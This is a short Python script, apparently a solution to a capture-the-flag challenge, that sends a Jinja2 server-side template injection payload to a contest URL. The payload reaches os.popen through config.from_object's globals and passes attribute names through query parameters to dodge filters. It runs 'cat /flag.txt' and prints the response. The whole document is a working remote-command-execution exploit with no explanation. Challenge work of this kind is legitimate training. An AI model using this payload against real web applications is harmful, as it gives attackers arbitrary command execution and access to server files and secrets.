
import requests
import html

target = "https://mnbvcxzasdfghjklz-csc26.cybersecuritychallenge.al/abonohu"
params = {
    "m": "from_object", "g": "__globals__", "os": "os",
    "p": "popen", "r": "read", "c": "cat /flag.txt"
}
payload = "{{ (config[request.args.m][request.args.g][request.args.os]|attr(request.args.p))(request.args.c)|attr(request.args.r)() }}"

resp = requests.post(target, data={"name": payload, "email": "a@b.com"}, params=params)
print(html.unescape(resp.text))